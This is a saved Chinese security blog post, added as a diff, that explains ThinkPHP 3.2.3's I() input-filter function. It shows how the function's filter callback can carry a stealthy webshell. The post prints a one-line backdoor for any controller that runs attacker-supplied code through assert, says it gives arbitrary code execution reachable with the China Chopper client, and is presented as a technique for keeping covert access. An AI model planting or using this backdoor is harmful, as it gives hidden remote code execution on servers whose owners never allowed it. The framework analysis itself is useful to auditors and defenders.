@@ -1,0 +1,361 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./ThinkPHP留后门技巧  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./ThinkPHP留后门技巧  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./ThinkPHP留后门技巧  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>ThinkPHP留后门技巧 | 离别歌</title>
+<link href="./ThinkPHP留后门技巧  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./ThinkPHP留后门技巧  离别歌/styles.css" rel="stylesheet"/>
+<link href="./ThinkPHP留后门技巧  离别歌/style.css" rel="stylesheet"/>
+<link href="./ThinkPHP留后门技巧  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./ThinkPHP留后门技巧  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./ThinkPHP留后门技巧  离别歌/jquery.min.js"></script>
+<link href="/static/cactus/css/code.css" rel="stylesheet"/>
+<link href="./ThinkPHP留后门技巧  离别歌/button.css" rel="stylesheet"/>
+<link href="./ThinkPHP留后门技巧  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./ThinkPHP留后门技巧  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html&amp;text=ThinkPHP%E7%95%99%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html&amp;title=ThinkPHP%E7%95%99%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html&amp;is_video=false&amp;description=ThinkPHP%E7%95%99%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=ThinkPHP%E7%95%99%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html&amp;title=ThinkPHP%E7%95%99%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html&amp;title=ThinkPHP%E7%95%99%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html&amp;title=ThinkPHP%E7%95%99%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html&amp;title=ThinkPHP%E7%95%99%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html&amp;name=ThinkPHP%E7%95%99%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">ThinkPHP留后门技巧</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2015年10月15日 00:34" itemprop="datePublished">
+                    2015 十月 15 00:34
+                </time>
+</div>
+<div class="article-tag">
+            阅读：5083
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">回调后门</a>,
+                
+                <a class="tag-link" href="/tag/thinkphp">thinkphp</a>,
+                
+                <a class="tag-link" href="/tag/webshell">webshell</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>90sec上有人问，我说了还有小白不会用。去年我审计TP的时候留意到的，干脆分析一下代码和操作过程。</p>
+<p>thinkphp的I函数，是其处理输入的函数，一般用法为I('get.id')——从$_GET数组中取出键为id的值，post、cookie类似。</p>
+<p>let me see see I函数的代码：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">I</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$datas</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="o">...</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="s1">''</span> <span class="o">==</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// 获取全部变量</span>
+        <span class="nv">$data</span>    <span class="o">=</span> <span class="nv">$input</span><span class="p">;</span>
+        <span class="nv">$filters</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$filter</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$filter</span> <span class="o">:</span> <span class="nx">C</span><span class="p">(</span><span class="s1">'DEFAULT_FILTER'</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$filters</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$filters</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$filters</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span> <span class="nv">$filters</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filters</span> <span class="k">as</span> <span class="nv">$filter</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$data</span> <span class="o">=</span> <span class="nx">array_map_recursive</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span> <span class="c1">// 参数过滤</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$input</span><span class="p">[</span><span class="nv">$name</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="c1">// 取值操作</span>
+        <span class="nv">$data</span>    <span class="o">=</span> <span class="nv">$input</span><span class="p">[</span><span class="nv">$name</span><span class="p">];</span>
+        <span class="nv">$filters</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$filter</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$filter</span> <span class="o">:</span> <span class="nx">C</span><span class="p">(</span><span class="s1">'DEFAULT_FILTER'</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$filters</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$filters</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">===</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$filters</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">!==</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$filters</span><span class="p">,</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+                        <span class="c1">// 支持正则验证</span>
+                        <span class="k">return</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$default</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$default</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nv">$filters</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span> <span class="nv">$filters</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_int</span><span class="p">(</span><span class="nv">$filters</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$filters</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$filters</span><span class="p">);</span>
+            <span class="p">}</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$filters</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filters</span> <span class="k">as</span> <span class="nv">$filter</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$filter</span><span class="p">))</span> <span class="p">{</span>
+                        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">?</span> <span class="nx">array_map_recursive</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$filter</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="c1">// 参数过滤</span>
+                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nb">is_int</span><span class="p">(</span><span class="nv">$filter</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$filter</span> <span class="o">:</span> <span class="nb">filter_id</span><span class="p">(</span><span class="nv">$filter</span><span class="p">));</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="k">return</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$default</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$default</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="o">...</span>
+    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>I函数的第三个参数是$filter，作用是对变量的过滤。</p>
+<p>新版本（3.2.3）中，$filter可以传入两种4种值：</p>
+<ol>
+<li>一个过滤函数（字符串）</li>
+<li>一些过滤函数组成的字符串，其间用“|”分割</li>
+<li>一些过滤函数的字符串组成的数组</li>
+<li>以“/”开头的正则表达式</li>
+</ol>
+<p>可见代码，若$filter为空的话，其默认值为C('DEFAULT_FILTER')。我们在配置文件中可以看到，DEFAULT_FILTER=htmlspecialchars</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201510/07e21444846812.png"><img alt="convention_php_—_thinkphp.png" src="./ThinkPHP留后门技巧  离别歌/thum-07e21444846812.png"/></a></p>
+<p>以上4个情况最后归为两个，1是过滤回调函数，2是过滤的正则。正则部分如下：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">===</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$filters</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">!==</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$filters</span><span class="p">,</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// 支持正则验证</span>
+        <span class="k">return</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$default</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$default</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span> 
+</pre></div>
+<p>如果第0个字符是/，则说明传入的是正则，用preg_match进行匹配验证，不匹配则返回默认值$default。</p>
+<p>而回调函数部分，是我们留后门的关键。核心是这一段：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$filters</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filters</span> <span class="k">as</span> <span class="nv">$filter</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$filter</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$data</span> <span class="o">=</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">?</span> <span class="nx">array_map_recursive</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$filter</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="c1">// 参数过滤</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$data</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nb">is_int</span><span class="p">(</span><span class="nv">$filter</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$filter</span> <span class="o">:</span> <span class="nb">filter_id</span><span class="p">(</span><span class="nv">$filter</span><span class="p">));</span>
+            <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$default</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$default</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>如果函数存在，则直接调用array_map_recursive执行。如果函数不存在，则用php默认的过滤器filter_var进行过滤。</p>
+<p>我们跟进array_map_recursive函数：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">array_map_recursive</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$result</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span>
+        <span class="o">?</span> <span class="nx">array_map_recursive</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$val</span><span class="p">)</span>
+        <span class="o">:</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$val</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>明显是一个递归执行的过程，最后调用的是call_user_func 。</p>
+<p>还记得我说过的php回调后门么（<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html"><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></a>），ThinkPHP厚道，居然给我们预置了一个回调后门，让我们可以万分隐蔽的留下webshell。</p>
+<p>所以，我们只需要随意找个controller，在可访问的方法中插入：</p>
+<div class="codehilite"><pre><span></span>I('post.90sec', '', I('get.i'));
+</pre></div>
+<p>如上，第三个参数就是刚说的$filter，我们只需要把回调后门函数名字（assert）作为第三个参数传入，即可构造一个回调后门。</p>
+<p>我就拿thinkphp默认的IndexController下的index方法示例：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201510/74ad1444847821.png"><img alt="IndexController_class_php_—_thinkphp.png" src="./ThinkPHP留后门技巧  离别歌/thum-74ad1444847821.png"/></a></p>
+<p>如下即可执行任意代码：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201510/b9411444847902.png"><img alt="phpinfo__.png" src="./ThinkPHP留后门技巧  离别歌/thum-b9411444847902.png"/></a></p>
+<p>一个回调后门，菜刀也可以连接。</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2295">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./ThinkPHP留后门技巧  离别歌/13f7b183cacb900befad4bddef3d3ec6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://ibear.fokite.com" target="_blank">ibear</a>
+<time datetime="2016年2月13日 16:42" itemprop="datePublished">
+                            2016 二月 13 16:42
+                        </time>
+<a href="javascript:reply_to('2295', 'ibear')">回复</a>
+</p>
+<p class="comment-meta">已经帮你报告TP官方。</p>
+</div>
+</div>
+<div class="row" id="comment-2245">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./ThinkPHP留后门技巧  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">路人甲</a>
+<time datetime="2015年11月2日 11:14" itemprop="datePublished">
+                            2015 十一月 02 11:14
+                        </time>
+<a href="javascript:reply_to('2245', '路人甲')">回复</a>
+</p>
+<p class="comment-meta">虽然不懂php，还是感觉P大的分析很犀利！赞！</p>
+</div>
+</div>
+<div class="row" id="comment-2238">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./ThinkPHP留后门技巧  离别歌/88fe47556bab3799baf117159302ce67.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://nimaboke.com" target="_blank">吴尼玛</a>
+<time datetime="2015年10月25日 11:21" itemprop="datePublished">
+                            2015 十月 25 11:21
+                        </time>
+<a href="javascript:reply_to('2238', '吴尼玛')">回复</a>
+</p>
+<p class="comment-meta">好可怕的样子</p>
+</div>
+</div>
+<div class="row" id="comment-2237">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./ThinkPHP留后门技巧  离别歌/228e9fa349503e859551a84db5ecd9c1.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://applehater.cn" target="_blank">拉拉</a>
+<time datetime="2015年10月17日 10:25" itemprop="datePublished">
+                            2015 十月 17 10:25
+                        </time>
+<a href="javascript:reply_to('2237', '拉拉')">回复</a>
+</p>
+<p class="comment-meta">那么那么，有什么作用的讷</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2242">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./ThinkPHP留后门技巧  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">123</a>
+<time datetime="2015年10月28日 17:34" itemprop="datePublished">
+                            2015 十月 28 17:34
+                        </time>
+<a href="javascript:reply_to('2242', '123')">回复</a>
+</p>
+<p class="comment-meta">@拉拉：执行任意函数，卧槽还不牛逼么</p>
+</div>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="2871fa47b36ad41129cc695108fc29fdb1c6182f"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./ThinkPHP留后门技巧  离别歌/2871fa47b36ad41129cc695108fc29fdb1c6182f"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="371">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="45ksiKPjgKTm9WLk7xVi9wFuk9SLurWICpFY6e1yHxNL9B9zVOp2IaHztdlTdVLS"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./ThinkPHP留后门技巧  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./ThinkPHP留后门技巧  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
